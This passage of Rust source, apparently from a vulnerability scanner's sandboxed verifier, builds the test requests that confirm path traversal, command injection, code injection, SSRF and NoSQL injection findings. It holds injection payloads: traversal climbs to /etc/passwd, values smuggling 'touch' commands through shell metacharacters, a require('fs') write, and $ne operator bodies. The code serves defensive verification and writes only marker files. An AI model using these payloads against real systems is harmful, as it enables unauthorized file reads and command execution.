//! The concrete requests a [`Probe`] turns into, and how a reproduction is recognized. Pure: the
//! sandbox ([`super::sandbox`]) sends these and reports back what it observed, and
//! [`reproduced`] decides. A payload only ever makes a benign, self-identifying signal — read a
//! planted marker file, write a marker file, or call a marker service — so a hit is unambiguous
//! and leaves nothing behind but the marker.

use super::plan::{DocEnvelope, Entry, Envelope, Method, Probe};
use jss_core::VulnClass;

/// The harmless value every non-payload envelope member is filled with, so a handler's early
/// presence guard (`!obj.from`) passes while the proof still rides the one payload-bearing member.
const ENVELOPE_PLACEHOLDER: &str = "jsspector";

/// The network alias the sandbox gives the marker service. An outbound request aimed here reaches
/// the marker; kept in one place so the host-only SSRF payload and [`Canary::service_url`] agree.
pub const MARKER_HOST: &str = "jss-marker";

/// Extensions commonly appended to a tainted file path before the read, plus the empty string for
/// the raw name. The canary is planted under each so a traversal through a handler that appends one
/// of these still reads the token. Not tied to any one target: these are the ordinary extensions a
/// content/download handler suffixes.
pub const PLANTED_SUFFIXES: &[&str] = &[
    "", ".md", ".json", ".html", ".htm", ".txt", ".js", ".yml", ".yaml", ".xml", ".csv",
];

/// The name of the canary *directory* planted for a traversal whose sink appends a fixed segment
/// after the tainted input (`path.join(base, id, 'session.json')`): the token file is written at
/// `<dir>/<appended-suffix>`, and the payload climbs to the directory so the handler's own appended
/// segment completes the path. Kept distinct from [`Canary::planted_file`] so the two never clash.
pub const PLANTED_DIR: &str = "jss-canary-read.d";

/// A per-run marker. Everything a payload does is tagged with `token`, so a reproduction is told
/// from the app's normal behavior by the token alone.
#[derive(Debug, Clone)]
pub struct Canary {
    pub token: String,
    callback_host: Option<String>,
}

impl Canary {
    pub fn new(token: String) -> Self {
        Self {
            token,
            callback_host: None,
        }
    }

    /// Use a registered public callback host while the target remains on the isolated verifier
    /// network. The host must be a short-lived Satori callback token, never an arbitrary URL.
    pub fn with_callback_host(mut self, host: Option<String>) -> Self {
        self.callback_host = host;
        self
    }

    pub fn marker_host(&self) -> &str {
        self.callback_host.as_deref().unwrap_or(MARKER_HOST)
    }

    pub fn callback_host(&self) -> Option<&str> {
        self.callback_host.as_deref()
    }

    /// The file planted in the image for a read to find, holding the secret token. Its path is
    /// deliberately independent of the token: an endpoint that merely reflects the requested
    /// URL must never satisfy the read proof.
    pub fn planted_file(&self) -> String {
        "/jss-canary-read".to_owned()
    }

    /// Every path the canary is planted at: the bare file and one per extension a handler commonly
    /// appends to a tainted path before the read (`input + '.md'`, `input + '.json'`). The payload
    /// always asks for the bare name; a handler that appends a known extension then reads
    /// `<canary><ext>`, which holds the same token, so a genuine traversal still proves itself.
    pub fn planted_files(&self) -> Vec<String> {
        let base = self.planted_file();
        PLANTED_SUFFIXES
            .iter()
            .map(|suffix| format!("{base}{suffix}"))
            .collect()
    }

    /// The directory the sandbox plants for a traversal whose sink appends a fixed segment after the
    /// tainted input: the token file lives at `<planted_dir>/<suffix>`, and the payload climbs here.
    pub fn planted_dir(&self) -> String {
        format!("/{PLANTED_DIR}")
    }

    /// The JSON document planted at `<planted_dir>/<suffix>`: the token under common field names a
    /// handler might reflect, so it surfaces whether the sink echoes the bytes raw or parses the
    /// file and renders one of its fields. The content is always valid JSON (survives a `JSON.parse`)
    /// and always contains the token as a substring; the token alone remains the proof.
    pub fn planted_dir_document(&self) -> String {
        let t = &self.token;
        let fields = [
            "id", "name", "title", "value", "data", "content", "message", "text",
        ];
        let body = fields
            .iter()
            .map(|field| format!("\"{field}\":\"{t}\""))
            .collect::<Vec<_>>()
            .join(",");
        format!("{{{body}}}")
    }

    /// The file a write-payload is asked to create, tagged with the probe's `nonce` so one
    /// probe's hit never confirms another's.
    pub fn written_file(&self, nonce: u32) -> String {
        format!("/tmp/jss-hit-{}-{nonce}", self.token)
    }

    /// The token a request-payload carries to the marker service for this probe.
    pub fn service_token(&self, nonce: u32) -> String {
        format!("{}-{nonce}", self.token)
    }

    /// A token used only as an entry name inside a planted directory. Keeping it distinct from the
    /// generic file-content token prevents a different read sink in the same verifier session from
    /// satisfying a directory-listing probe merely by returning the shared canary document.
    pub fn listing_token(&self, nonce: u32) -> String {
        format!("{}-listing-{nonce}", self.token)
    }

    /// The marker service URL a request-payload is aimed at, carrying the probe's token in its
    /// path. The sandbox runs the service on the app's private network under `jss-marker`.
    pub fn service_url(&self, nonce: u32) -> String {
        format!(
            "http://{}/{}",
            self.marker_host(),
            self.service_token(nonce)
        )
    }
}

/// How a hit is observed, out of band from the HTTP response.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Signal {
    /// The token appears in the HTTP response body (a planted file was read back).
    InResponse,
    /// Known file contents appear in the response body. Used only inside the disposable Linux
    /// verifier container to prove a traversal can read outside the application tree.
    ResponseContains(String),
    /// A file at this path now exists in the app container (a write-payload ran).
    FileWritten(String),
    /// The marker service was reached carrying this token (a request-payload ran). The sandbox
    /// looks for it in the service's log.
    ServiceReached(String),
}

/// One request to send: the verb, the path (query already appended), optional JSON body, extra
/// headers, and the signal that would confirm it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Attempt {
    pub verb: &'static str,
    pub target: String,
    pub body: Option<String>,
    pub headers: Vec<(String, String)>,
    pub signal: Signal,
}

/// Every request worth sending for a probe. Several payloads per finding (an unknown directory
/// depth, URL-encoded separators, different metacharacters), each self-contained.
pub fn attempts(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<Attempt> {
    let verb = probe.method.verb(&probe.entry);
    // A directory-listing traversal proves itself by a planted file name surfacing in the returned
    // listing, not by file content, so it needs its own climbing payloads: the tainted parameter
    // climbs to the planted canary directory and the handler's appended sibling (an enum value the
    // handler accepts) completes the path to a real planted subdirectory. These lead the request
    // list. They deliberately do not fall back to the content-oracle payloads below: a full scan can
    // exercise several sinks in one app session, and content planted for a different read sink must
    // never verify this directory-listing sink.
    let dir_attempts = directory_listing_attempts(probe, canary, nonce);
    if probe.class == VulnClass::PathTraversal && probe.lists_dir {
        return dir_attempts;
    }
    let mut payloads = payloads(probe.class, canary, nonce);
    // A traversal sink that appends a fixed segment after the tainted input reads
    // `<tainted-dir>/<suffix>`, never the tainted value itself. Climb to a planted canary
    // directory so the handler's own appended segment completes the path to the token file.
    if probe.class == VulnClass::PathTraversal && probe.read_suffix.is_some() {
        let dir = canary.planted_dir();
        let dir = dir.trim_start_matches('/');
        for depth in [1usize, 3, 6, 8, 10, 12] {
            payloads.push((format!("{}{dir}", "../".repeat(depth)), Signal::InResponse));
        }
    }
    // The handler decodes its input as a base64-encoded JSON envelope and uses one member of it, so
    // the raw payload never reaches the sink on its own. Pack each payload into that envelope — under
    // the member that reaches the sink, with the other members the handler requires present — so the
    // decoded object carries the payload exactly where the sink reads it.
    if let Some(env) = &probe.envelope {
        for (value, _) in payloads.iter_mut() {
            *value = envelope_encode(env, value);
        }
    }
    // The tainted body field is a structured document a parse function turns into an object before
    // the sink reads one of its members, so the raw payload never reaches the sink on its own. Wrap
    // each payload into that document — under the JSON key that maps to the sink member, inside the
    // literal scaffold the parse function's extraction requires, with the other members the handler
    // reads filled by a placeholder so a presence/validity guard passes.
    if let Some(doc) = &probe.doc_envelope {
        for (value, _) in payloads.iter_mut() {
            *value = doc_encode(doc, value);
        }
    }
    let rest: Vec<Attempt> = payloads
        .into_iter()
        .flat_map(|(value, signal)| {
            if let Entry::Header(name) = &probe.entry
                && probe.class == VulnClass::Ssrf
            {
                // A tainted header that reaches an outbound request has two shapes: the whole
                // value is the URL (`fetch(req.headers['x'])`), or the value is only the
                // destination host of a fixed-scheme/port request (`http.request({ host })`). Send
                // both — the full marker URL as the header, and, as a host, the marker alias with
                // the probe token in the route path the handler forwards onward. Either one that
                // lands at the marker confirms the SSRF.
                let as_url = place(probe, verb, &value, signal.clone());
                let token = canary.service_token(nonce);
                let mut host_headers = vec![(name.clone(), canary.marker_host().to_owned())];
                host_headers.extend(sibling_headers(probe, name));
                let as_host = Attempt {
                    verb,
                    target: route_with_token(&probe.path, &token, &probe.path_fillers),
                    body: None,
                    headers: host_headers,
                    signal: Signal::ServiceReached(token),
                };
                return vec![as_url, as_host];
            }
            if let Entry::PathParam(name) = &probe.entry
                && value.contains('/')
            {
                // A route parameter usually matches one path segment (`/media/:url`), so a value
                // with a literal `/` never reaches the handler. Send it also as one segment, `/`
                // percent-encoded; the router decodes it back before the handler reads it. The
                // literal form stays first for multi-segment (wildcard) parameters.
                let attempt = place(probe, verb, &value, signal);
                let segment = attempt.target_with(
                    name,
                    &probe.path,
                    &encode_segment(&value),
                    &probe.path_fillers,
                );
                return vec![
                    attempt.clone(),
                    Attempt {
                        target: segment,
                        ..attempt
                    },
                ];
            }
            if probe.entry == Entry::Url && probe.class == VulnClass::Ssrf {
                // An upgrade entry (`server.on('upgrade', ...)`) forwards the request URL too, but
                // reaches only through an HTTP upgrade request, and often only for paths it
                // recognizes. Send the marker URL as an absolute-form upgrade target: bare, and
                // under each gate path the handler accepts, with the token carried onward either as
                // a sub-path (for `startsWith` gates) or in the query (for exact-match gates).
                if probe.method.is_upgrade() {
                    let token = canary.service_token(nonce);
                    let headers = vec![
                        ("Connection".to_owned(), "Upgrade".to_owned()),
                        ("Upgrade".to_owned(), "websocket".to_owned()),
                    ];
                    let upgrade = |target: String| Attempt {
                        verb,
                        target,
                        body: None,
                        headers: headers.clone(),
                        signal: signal.clone(),
                    };
                    let mut out = vec![upgrade(value.clone())];
                    for gate in &probe.gate_paths {
                        let gate = gate.trim_end_matches('/');
                        out.push(upgrade(format!(
                            "http://{}{gate}/{token}",
                            canary.marker_host()
                        )));
                        out.push(upgrade(format!(
                            "http://{}{gate}?jss={token}",
                            canary.marker_host()
                        )));
                    }
                    return out;
                }
                // The request target itself reaches an outbound request
                // (`new URL(req.url, base)`, a forward proxy). HTTP lets a client send it in
                // absolute form (`GET http://host/path HTTP/1.1`, RFC 9112 §3.2.2), and a URL
                // resolved against a base then keeps the client's host. Send the marker URL that
                // way too; the path form stays first for a handler that appends the path to a
                // URL of its own.
                let as_path = place(probe, verb, &value, signal.clone());
                let absolute = Attempt {
                    target: value.clone(),
                    ..as_path.clone()
                };
                let mut out = vec![as_path, absolute];
                // The parsed request URL may feed its query parameters into the sink, with one of
                // them chosen as the outbound host (`const q = Object.fromEntries(url.searchParams);
                // fetch(q.base + endpoint)`). Send the marker URL in each query parameter the handler
                // reads, under each path it dispatches on (plus its mount path), so whichever pairing
                // reaches the sink lands at the marker. Each attempt is self-contained; a wrong
                // pairing simply does not reproduce.
                let mut gates: Vec<&str> = probe.gate_paths.iter().map(String::as_str).collect();
                if !probe.path.is_empty() && !gates.contains(&probe.path.as_str()) {
                    gates.push(probe.path.as_str());
                }
                for gate in gates {
                    for param in &probe.url_query_params {
                        out.push(Attempt {
                            verb,
                            target: format!("{gate}?{}={}", encode(param), encode(&value)),
                            body: None,
                            headers: Vec::new(),
                            signal: signal.clone(),
                        });
                    }
                }
                return out;
            }
            if !matches!(probe.entry, Entry::Body(None)) {
                return vec![place(probe, verb, &value, signal)];
            }
            let mut entries = vec![Entry::Body(None)];
            entries.extend(
                body_fields(probe.class)
                    .iter()
                    .map(|field| Entry::Body(Some((*field).to_owned()))),
            );
            entries
                .into_iter()
                .flat_map(|entry| {
                    let mut candidate = probe.clone();
                    candidate.entry = entry.clone();
                    let attempt = place(&candidate, verb, &value, signal.clone());
                    let mut variants = vec![attempt.clone()];
                    if probe.class == VulnClass::Ssrf
                        && matches!(entry, Entry::Body(Some(ref field)) if field == "url")
                    {
                        variants.push(Attempt {
                            body: Some(json_object_with_field(
                                "url",
                                &value,
                                "filepath",
                                "jsspector-placeholder",
                            )),
                            ..attempt
                        });
                    }
                    variants
                })
                .collect()
        })
        .collect();
    rest
}

/// The climbing requests for a directory-listing traversal: the tainted route parameter is driven
/// (as one percent-encoded segment, so a `/`-bearing climb survives routing) to the planted canary
/// directory, and, when the handler appends a sibling route parameter to form the read path, that
/// sibling slot is filled with each value the handler accepts. A hit is the planted file name
/// appearing in the response listing. Empty for a probe that does not list a directory.
fn directory_listing_attempts(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<Attempt> {
    if probe.class != VulnClass::PathTraversal || !probe.lists_dir {
        return Vec::new();
    }
    let Entry::PathParam(tainted) = &probe.entry else {
        return Vec::new();
    };
    let verb = probe.method.verb(&probe.entry);
    let dir = canary.planted_dir();
    let dir = dir.trim_start_matches('/');
    // The sibling values to drive the appended slot with; an empty name means no appended slot (the
    // tainted value is itself the listed directory).
    let sibling: Vec<(String, String)> = match &probe.appended_param {
        Some(ap) => ap
            .values
            .iter()
            .map(|v| (ap.name.clone(), v.clone()))
            .collect(),
        None => vec![(String::new(), String::new())],
    };
    let mut out = Vec::new();
    for (sib_name, sib_value) in &sibling {
        for depth in [1usize, 2, 3, 5, 7, 9, 12] {
            let climb = format!("{}{dir}", "../".repeat(depth));
            let mut target = probe
                .path
                .replace(&format!("{{{tainted}}}"), &encode_segment(&climb));
            if !sib_name.is_empty() {
                target = target.replace(&format!("{{{sib_name}}}"), &encode_path(sib_value));
            }
            target = fill_remaining(&target, &probe.path_fillers);
            out.push(Attempt {
                verb,
                target,
                body: None,
                headers: Vec::new(),
                signal: Signal::ResponseContains(canary.listing_token(nonce)),
            });
        }
    }
    out
}

/// The three requests of the path-traversal read oracle, used as a fallback when a read sink
/// consumes the planted canary file but never echoes it (a blind traversal: the handler reads the
/// file and then crashes, redirects, or renders without reflecting its bytes). `present` climbs to a
/// canary planted *only outside the base directory*; `absent` and `absent_sub` climb to equivalent
/// out-of-base paths that were never planted. A vulnerable handler takes its file-found branch for
/// `present` and its not-found branch for the other two (which agree); a handler that confines the
/// path reaches none of them and answers all three alike.
pub struct ReadOracle {
    pub present: Attempt,
    pub present_value: String,
    pub absent: Attempt,
    pub absent_value: String,
    pub absent_sub: Attempt,
    pub absent_sub_value: String,
}

/// Builds the read oracle for a path-traversal probe, or `None` for an entry with no placeable path
/// segment (a header) or a non-traversal class.
pub fn read_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Option<ReadOracle> {
    if probe.class != VulnClass::PathTraversal {
        return None;
    }
    // Where the canary sits: a directory when the sink appends a fixed segment after the tainted
    // input, otherwise the planted file itself.
    let present_name = if probe.read_suffix.is_some() {
        PLANTED_DIR.to_owned()
    } else {
        canary.planted_file().trim_start_matches('/').to_owned()
    };
    let absent_name = format!("jss-oracle-absent-{}-{nonce}", canary.token);
    // `..` segments above the filesystem root are dropped by path normalization, so a deep climb
    // reaches the root from any base depth.
    let climb = "../".repeat(12);
    let present_value = format!("{climb}{present_name}");
    let absent_value = format!("{climb}{absent_name}");
    let absent_sub_value = format!("{climb}{present_name}/{absent_name}");
    Some(ReadOracle {
        present: place_traversal(probe, &present_value)?,
        present_value,
        absent: place_traversal(probe, &absent_value)?,
        absent_value,
        absent_sub: place_traversal(probe, &absent_sub_value)?,
        absent_sub_value,
    })
}

/// The requests and planted paths that prove a removal sink (`fs.unlink`, `fs.rm`, …) opens an
/// attacker-controlled path outside the base directory: a `target` file planted outside the base that
/// `present` climbs to and asks the handler to remove, and a `control` file planted alongside it that
/// the request never names. A vulnerable handler removes `target` (it disappears) while `control`
/// survives; a handler that confines the path removes neither.
pub struct DeleteOracle {
    pub present: Attempt,
    /// The directory to create before planting, holding both planted files.
    pub dir: String,
    /// The out-of-base file the traversal targets; must disappear after the request.
    pub target_path: String,
    /// A sibling file planted alongside the target but never named by the request; must survive.
    pub control_path: String,
}

/// Builds the removal oracle for a path-traversal probe whose sink deletes its argument, or `None`
/// for an entry with no placeable path segment. The target sits outside the application's base
/// directory (under the planted-canary root), reached by a deep `../` climb that path normalization
/// resolves from any base depth; when the sink appends a fixed segment the climb lands on the parent
/// directory and the handler's own segment completes the path.
pub fn delete_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Option<DeleteOracle> {
    if probe.class != VulnClass::PathTraversal {
        return None;
    }
    let unique = format!("jss-del-{}-{nonce}", canary.token);
    let dir = format!("/{PLANTED_DIR}/{unique}");
    let climb = "../".repeat(12);
    let (present_value, target_path) = match &probe.read_suffix {
        Some(suffix) => (
            format!("{climb}{PLANTED_DIR}/{unique}"),
            format!("{dir}/{}", suffix.trim_start_matches('/')),
        ),
        None => (
            format!("{climb}{PLANTED_DIR}/{unique}/target"),
            format!("{dir}/target"),
        ),
    };
    let control_path = format!("{dir}/jss-del-keep");
    let present = place_traversal(probe, &present_value)?;
    Some(DeleteOracle {
        present,
        dir,
        target_path,
        control_path,
    })
}

/// Places a traversal value into the probe's entry, as a single percent-encoded path segment when
/// the entry is a route parameter (so a `/`-bearing climb survives routing as the verified payloads
/// do). `None` for a header, which has no path to climb.
fn place_traversal(probe: &Probe, value: &str) -> Option<Attempt> {
    let verb = probe.method.verb(&probe.entry);
    match &probe.entry {
        Entry::Header(_) => None,
        Entry::PathParam(name) if value.contains('/') => {
            let mut attempt = place(probe, verb, value, Signal::InResponse);
            attempt.target = attempt.target_with(
                name,
                &probe.path,
                &encode_segment(value),
                &probe.path_fillers,
            );
            Some(attempt)
        }
        _ => Some(place(probe, verb, value, Signal::InResponse)),
    }
}

/// Three otherwise-identical NoSQL requests: one match-all operator and two independent
/// match-none controls. Only a database interpreting the object as an operator should make the
/// first response differ while both controls agree.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NosqlCase {
    pub field: String,
    pub match_all: Attempt,
    pub match_none_eq: Attempt,
    pub match_none_in: Attempt,
    /// The absent scalar token injected inside the operator objects, so a response that echoes the
    /// payload (a cast-error message, say) can be normalized out before the controls are compared.
    pub absent: String,
}

const NOSQL_FIELDS: [&str; 15] = [
    "id", "_id", "user", "userId", "user_id", "username", "email", "login", "uid", "name",
    "handle", "token", "key", "slug", "account",
];

pub fn nosql_cases(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<NosqlCase> {
    let verb = probe.method.verb(&Entry::Body(None));
    let absent = format!("jssnomatch{}{nonce}", canary.token);
    let primary = match &probe.entry {
        Entry::Body(Some(name)) => Some(name.clone()),
        _ => None,
    };
    let mut fields = Vec::new();
    if let Some(name) = &primary {
        fields.push(name.clone());
    }
    for name in NOSQL_FIELDS {
        if !fields.iter().any(|existing| existing == name) {
            fields.push(name.to_owned());
        }
    }
    fields
        .iter()
        .map(|field| {
            let body = |operator: String| {
                let mut members = probe.siblings.clone();
                if let Some(name) = &primary
                    && name != field
                    && members.iter().all(|(key, _)| key != name)
                {
                    members.push((name.clone(), ENVELOPE_PLACEHOLDER.to_owned()));
                }
                members.retain(|(key, _)| key != field);
                let mut obj = format!("{{\"{}\":{operator}", json_escape(field));
                for (key, value) in &members {
                    obj.push_str(&format!(
                        ",\"{}\":\"{}\"",
                        json_escape(key),
                        json_escape(value)
                    ));
                }
                obj.push('}');
                Attempt {
                    verb,
                    target: fill_remaining(&probe.path, &probe.path_fillers),
                    body: Some(obj),
                    headers: vec![("Content-Type".to_owned(), "application/json".to_owned())],
                    signal: Signal::InResponse,
                }
            };
            NosqlCase {
                field: field.clone(),
                match_all: body(format!("{{\"$ne\":\"{}\"}}", json_escape(&absent))),
                match_none_eq: body(format!("{{\"$eq\":\"{}\"}}", json_escape(&absent))),
                match_none_in: body("{\"$in\":[]}".to_owned()),
                absent: absent.clone(),
            }
        })
        .collect()
}

/// Whether the three responses prove the object was interpreted as a database operator. Operator
/// objects echoed in cast errors are normalized before comparison; a pure input-echo response then
/// normalizes identically for all three cases and cannot become a false proof.
pub fn nosql_reproduced(
    match_all: &str,
    match_none_eq: &str,
    match_none_in: &str,
    absent: &str,
) -> bool {
    let all = redact_nosql_echo(match_all, absent);
    let none_eq = redact_nosql_echo(match_none_eq, absent);
    let none_in = redact_nosql_echo(match_none_in, absent);
    none_eq == none_in && all != none_eq && !all.trim().is_empty()
}

fn redact_nosql_echo(response: &str, absent: &str) -> String {
    let redacted = redact_operator_objects(response);
    if absent.is_empty() {
        redacted
    } else {
        redacted.replace(absent, "<redacted>")
    }
}

/// Replaces flat serialized Mongo operator objects while leaving their surrounding response intact.
fn redact_operator_objects(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut rest = input;
    while let Some(open) = rest.find('{') {
        out.push_str(&rest[..open]);
        let after = &rest[open + 1..];
        if let Some(close) = after.find('}') {
            let inner = &after[..close];
            if !inner.contains('{') && contains_mongo_operator(inner) {
                out.push_str("<op>");
                rest = &after[close + 1..];
                continue;
            }
        }
        out.push('{');
        rest = after;
    }
    out.push_str(rest);
    out
}

fn contains_mongo_operator(inner: &str) -> bool {
    inner
        .as_bytes()
        .windows(2)
        .any(|pair| pair.first() == Some(&b'$') && pair.get(1).is_some_and(u8::is_ascii_alphabetic))
}

fn body_fields(class: VulnClass) -> &'static [&'static str] {
    match class {
        VulnClass::Ssrf => &["url", "uri", "host", "endpoint", "target", "callback"],
        VulnClass::PathTraversal => &["path", "file", "filename", "name"],
        VulnClass::CommandInjection => &["command", "cmd", "input", "host"],
        VulnClass::CodeInjection => &["code", "script", "input"],
        _ => &[],
    }
}

/// The payload strings for a class, each with the signal it would trip. A read-marker payload is
/// confirmed in the response; a write- or call-marker payload, out of band.
fn payloads(class: VulnClass, canary: &Canary, nonce: u32) -> Vec<(String, Signal)> {
    match class {
        VulnClass::PathTraversal => {
            let file = canary.planted_file();
            let name = file.trim_start_matches('/');
            // First prove an unmistakable OS-file read in the disposable Linux container. Keep
            // the canary variants as a fallback for applications that reject `/etc/passwd` by
            // name but still allow traversal outside their intended root.
            let passwd = "etc/passwd";
            let passwd_signal = Signal::ResponseContains("root:x:0:0:root:".to_owned());
            let mut out = vec![
                (format!("/{passwd}"), passwd_signal.clone()),
                (file.clone(), Signal::InResponse),
                (format!("/{name}"), Signal::InResponse),
            ];
            for depth in [1usize, 3, 6, 10] {
                let up = "../".repeat(depth);
                out.push((format!("{up}{passwd}"), passwd_signal.clone()));
                out.push((
                    format!("{}etc%2fpasswd", "..%2f".repeat(depth)),
                    passwd_signal.clone(),
                ));
                out.push((format!("{up}{name}"), Signal::InResponse));
                out.push((
                    format!("{}{name}", "..%2f".repeat(depth)),
                    Signal::InResponse,
                ));
            }
            out
        }
        VulnClass::CommandInjection => {
            // A benign write of the marker file, reached through the metacharacters a shell
            // honors: separators, a pipe, a subshell, a newline.
            let hit = canary.written_file(nonce);
            let w = format!("touch {hit}");
            let signal = Signal::FileWritten(hit);
            [
                format!("x; {w}"),
                format!("x| {w}"),
                format!("x`{w}`"),
                format!("x$({w})"),
                format!("x\n{w}"),
                format!("$({w})"),
            ]
            .into_iter()
            .map(|value| (value, signal.clone()))
            .collect()
        }
        VulnClass::CodeInjection => {
            // JavaScript that writes the marker file if the value is evaluated or required as a
            // module specifier that resolves to an expression context.
            let hit = canary.written_file(nonce);
            let js = format!("require('fs').writeFileSync('{hit}','1')");
            let signal = Signal::FileWritten(hit);
            [
                format!("');{js};//"),
                format!("\");{js};//"),
                format!(";{js};"),
                js,
            ]
            .into_iter()
            .map(|value| (value, signal.clone()))
            .collect()
        }
        VulnClass::Ssrf => {
            // Point the request at the marker service; a reachable hit is the signal.
            vec![(
                canary.service_url(nonce),
                Signal::ServiceReached(canary.service_token(nonce)),
            )]
        }
        _ => Vec::new(),
    }
}

/// Puts `value` where the probe said it enters, returning the full request.
fn place(probe: &Probe, verb: &'static str, value: &str, signal: Signal) -> Attempt {
    let mut target = probe.path.clone();
    let mut body = None;
    let mut headers = Vec::new();
    match &probe.entry {
        Entry::Query(name) => {
            let sep = if target.contains('?') { '&' } else { '?' };
            target = format!("{target}{sep}{}={}", encode(name), encode(value));
            // The other query parameters the handler requires alongside this one.
            for (key, val) in &probe.siblings {
                target = format!("{target}&{}={}", encode(key), encode(val));
            }
        }
        Entry::Body(name) => {
            body = Some(match name {
                // The field under test, plus the other body fields the handler requires.
                Some(field) => json_object_fields(field, value, &probe.siblings),
                None => json_string(value),
            });
            headers.push(("Content-Type".to_owned(), "application/json".to_owned()));
        }
        Entry::PathParam(name) => {
            target = target.replace(&format!("{{{name}}}"), &encode_path(value));
        }
        Entry::Header(name) => {
            headers.push((name.clone(), header_safe(value)));
            // Other request headers the handler reads and forwards into the outbound request or
            // checks before the sink. Without them the handler errors or rejects before the tainted
            // header reaches the sink (`axios` throws on an outbound header value of `undefined`).
            headers.extend(sibling_headers(probe, name));
        }
        Entry::Url => {
            let rest = value.trim_start_matches('/');
            if probe.method == Method::Use {
                // A middleware mounted at a path prefix (`app.use('/clients', ...)`) only runs for
                // requests whose path begins with that prefix, and reads the full `req.originalUrl`
                // (prefix included). Place the payload *under* the mount so the request reaches the
                // handler and the traversal rides on the original URL.
                let prefix = probe.path.trim_end_matches('/');
                target = format!("{prefix}/{rest}");
            } else {
                // The payload is the path. Keep a single leading slash.
                target = format!("/{rest}");
            }
        }
    }
    // Any unfilled `{param}` slot gets its guard-pinned value, or a placeholder, so the route matches.
    target = fill_remaining(&target, &probe.path_fillers);
    Attempt {
        verb,
        target,
        body,
        headers,
        signal,
    }
}

/// Did the app reproduce the finding, given what the sandbox observed for one attempt: the
/// response body, whether the written-marker file appeared, and whether the marker service was
/// reached.
pub fn reproduced(
    attempt: &Attempt,
    canary: &Canary,
    response_body: &str,
    marker_file_exists: bool,
    service_reached: bool,
) -> bool {
    match &attempt.signal {
        Signal::InResponse => response_body.contains(&canary.token),
        Signal::ResponseContains(expected) => response_body.contains(expected),
        Signal::FileWritten(_) => marker_file_exists,
        Signal::ServiceReached(_) => service_reached,
    }
}

/// The route with its first `{param}` slot carrying `token` (so a handler that forwards the
/// request path onward carries the token to the marker) and any other slot filled with a
/// placeholder. A route with no slot is returned unchanged — the token cannot ride a fixed path,
/// and that attempt simply will not reproduce. `token` is alphanumeric with `-`, safe in a path
/// segment unencoded.
fn route_with_token(route: &str, token: &str, fillers: &[(String, String)]) -> String {
    let filled = match (route.find('{'), route.find('}')) {
        (Some(start), Some(_)) => match route[start..].find('}').map(|end| start + end) {
            Some(end) => format!("{}{}{}", &route[..start], token, &route[end + 1..]),
            None => route.to_owned(),
        },
        _ => route.to_owned(),
    };
    fill_remaining(&filled, fillers)
}

/// Fills any remaining `{name}` route slot: with the value a guard enclosing the sink pins the slot
/// to (so a branch- or allow-list-gated segment is accepted), falling back to a harmless placeholder
/// so the path still matches when the slot is unconstrained.
fn fill_remaining(path: &str, fillers: &[(String, String)]) -> String {
    let mut out = String::with_capacity(path.len());
    let mut rest = path;
    while let Some(open) = rest.find('{') {
        out.push_str(&rest[..open]);
        match rest[open..].find('}') {
            Some(close) => {
                let name = &rest[open + 1..open + close];
                match fillers.iter().find(|(slot, _)| slot == name) {
                    Some((_, value)) => out.push_str(&encode_segment(value)),
                    None => out.push('1'),
                }
                rest = &rest[open + close + 1..];
            }
            None => {
                out.push_str(&rest[open..]);
                return out;
            }
        }
    }
    out.push_str(rest);
    out
}

/// Minimal percent-encoding for a query key or value: everything but the unreserved set, and the
/// payload's own `/` and `.` kept readable where they are already safe in a query.
fn encode(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for byte in text.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(byte as char);
            }
            other => out.push_str(&format!("%{other:02X}")),
        }
    }
    out
}

impl Attempt {
    /// The probe's route with the `{name}` slot filled by an already-encoded `encoded` value and
    /// any other slot given a placeholder, as [`place`] does.
    fn target_with(
        &self,
        name: &str,
        route: &str,
        encoded: &str,
        fillers: &[(String, String)],
    ) -> String {
        fill_remaining(&route.replace(&format!("{{{name}}}"), encoded), fillers)
    }
}

/// Encoding for a value that must stay one path segment: everything but RFC 3986 unreserved
/// characters is percent-encoded, `/` included.
fn encode_segment(text: &str) -> String {
    let mut out = String::with_capacity(text.len() * 3);
    for byte in text.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'.' | b'_' | b'~') {
            out.push(byte as char);
        } else {
            out.push_str(&format!("%{byte:02X}"));
        }
    }
    out
}

/// Encoding for a value placed in a path segment: keep `/` and `.` so traversal reaches the
/// sink, encode the rest of what a URL forbids.
fn encode_path(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for byte in text.bytes() {
        match byte {
            b' ' => out.push_str("%20"),
            b'#' | b'?' | b'%' => out.push_str(&format!("%{byte:02X}")),
            other => out.push(other as char),
        }
    }
    out
}

/// The probe's sibling request headers (mined from the handler source) as `(name, value)` pairs,
/// excluding the tainted header itself, each CR/LF-stripped. Sent alongside the tainted header so a
/// handler that forwards or checks another header reaches the sink instead of erroring first.
fn sibling_headers(probe: &Probe, tainted: &str) -> Vec<(String, String)> {
    probe
        .siblings
        .iter()
        .filter(|(key, _)| key != tainted)
        .map(|(key, val)| (key.clone(), header_safe(val)))
        .collect()
}

/// Strips CR/LF from a header value (no request splitting); the payload itself carries no
/// newline for a header entry.
fn header_safe(text: &str) -> String {
    text.chars().filter(|c| *c != '\r' && *c != '\n').collect()
}

fn json_string(value: &str) -> String {
    format!("\"{}\"", json_escape(value))
}

fn json_object(field: &str, value: &str) -> String {
    format!("{{\"{}\":\"{}\"}}", json_escape(field), json_escape(value))
}

/// A JSON object of the field under test plus any sibling body fields (skipping any that would
/// duplicate the field under test).
fn json_object_fields(field: &str, value: &str, siblings: &[(String, String)]) -> String {
    let base = json_object(field, value);
    let extra: Vec<&(String, String)> = siblings.iter().filter(|(key, _)| key != field).collect();
    if extra.is_empty() {
        return base;
    }
    let mut out = base.trim_end_matches('}').to_owned();
    for (key, val) in extra {
        out.push_str(&format!(
            ",\"{}\":\"{}\"",
            json_escape(key),
            json_escape(val)
        ));
    }
    out.push('}');
    out
}

fn json_object_with_field(field: &str, value: &str, other: &str, other_value: &str) -> String {
    format!(
